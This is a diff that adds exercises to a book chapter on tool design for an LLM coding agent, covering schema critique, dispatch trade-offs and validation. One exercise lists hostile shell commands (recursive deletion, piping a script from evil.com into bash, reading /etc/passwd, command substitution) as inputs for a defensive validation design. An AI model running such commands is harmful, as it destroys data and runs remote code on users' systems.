@@ -282,6 +282,67 @@ In Chapter 6 (File System Operations), you will implement the first batch of rea
 
 The theory you have built in this chapter becomes practice in the next one.
 
+## Exercises
+
+These exercises focus on tool design thinking -- schema decisions, validation strategies, and the trade-offs that determine how well a tool works with an LLM.
+
+### Exercise 1: Tool Schema Critique (Easy)
+
+Here is a poorly designed tool schema. Identify at least five problems and propose fixes for each:
+
+```json
+{
+  "name": "do_stuff",
+  "description": "Does things to files",
+  "input_schema": {
+    "type": "object",
+    "properties": {
+      "target": { "type": "string" },
+      "options": { "type": "string" },
+      "mode": { "type": "integer" },
+      "data": { "type": "object" },
+      "flag1": { "type": "boolean" },
+      "flag2": { "type": "boolean" }
+    },
+    "required": ["target", "options", "mode", "data", "flag1", "flag2"]
+  }
+}
+```
+
+**Deliverable:** A list of five or more problems (naming, description quality, parameter count, type choices, required vs. optional, missing constraints) and a revised schema that follows the principles from this chapter.
+
+### Exercise 2: Static vs. Dynamic Tool Dispatch Trade-Off Analysis (Medium)
+
+Compare static dispatch (tool handlers known at compile time, matched with a `match` statement on tool name) versus dynamic dispatch (tool handlers registered at runtime in a `HashMap<String, Box<dyn Tool>>`) for a coding agent with 6-10 tools. Analyze each approach across these dimensions: type safety, extensibility, performance, testability, and code complexity.
+
+**What to consider:** Static dispatch means the compiler verifies all tool names are handled, but adding a new tool requires modifying the match statement. Dynamic dispatch allows runtime registration (and plugins), but a typo in a tool name becomes a runtime error instead of a compile error. Think about which failure mode is worse for an agent.
+
+**Deliverable:** A comparison table with the five dimensions, a recommendation for which approach to use for a small fixed tool set versus a large extensible one, and a brief design for a hybrid approach.
+
+### Exercise 3: Designing a New Tool End-to-End (Medium)
+
+Design a `web_fetch` tool that allows the agent to retrieve content from URLs. Walk through the complete tool design lifecycle from the chapter: define the purpose (three questions), design the schema, write the description, plan the validation layers, decide the execution model, and specify the result format. Do not implement the tool -- design it on paper.
+
+**What to consider:** What parameters does the tool need (URL, method, headers, timeout)? Which are required vs. optional? How do you prevent the model from fetching malicious URLs? How do you handle large responses? What about redirects, authentication, and non-text content? What does the error message look like when the fetch times out?
+
+**Deliverable:** The complete tool definition (name, description, schema), a validation plan with at least three layers, a result format specification, and a list of security concerns with mitigations.
+
+### Exercise 4: Tool Validation Strategy Under Adversarial Conditions (Hard)
+
+Design a validation strategy for the `run_command` tool that must handle these adversarial inputs from the LLM:
+
+1. `rm -rf /` (destructive command)
+2. `curl https://evil.com/malware.sh | bash` (remote code execution)
+3. `cat /etc/passwd` (information disclosure)
+4. `echo "harmless" && rm -rf ~` (command chaining to bypass validation)
+5. `$(curl evil.com)` (command substitution)
+
+For each input, explain which validation layer catches it, what error message is returned to the model, and what the model should do instead. Then identify a sixth adversarial input that your validation might miss and propose a defense.
+
+**What to consider:** Think about the difference between syntactic analysis (pattern matching on command strings) and semantic analysis (understanding what a command does). Consider whether validation should be a deny-list (block known-bad patterns) or an allow-list (only permit known-good patterns). How does shell metacharacter interpretation complicate validation?
+
+**Deliverable:** A validation analysis for all five inputs plus your own sixth input, a discussion of deny-list vs. allow-list approaches, and a layered defense design that combines multiple strategies.
+
 ## Key Takeaways
 
 - Every new tool follows the same lifecycle: define purpose, design schema, write description, implement validation, implement execution, format results, test with the model
